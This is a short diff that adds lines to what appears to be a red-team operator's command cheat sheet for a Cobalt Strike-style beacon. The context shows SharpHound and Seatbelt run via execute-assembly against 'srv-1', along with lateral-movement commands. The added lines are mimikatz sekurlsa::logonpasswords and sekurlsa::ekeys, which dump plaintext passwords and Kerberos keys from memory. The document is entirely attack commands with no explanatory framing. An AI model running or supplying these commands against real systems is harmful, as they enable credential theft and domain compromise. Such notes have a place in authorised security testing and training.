@@ -30,3 +30,9 @@ execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c Dc
 jump
 remote-exec
 execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
+
+netlogons
+ps
+
+mimikatz sekurlsa::logonpasswords
+mimikatz sekurlsa::ekeys
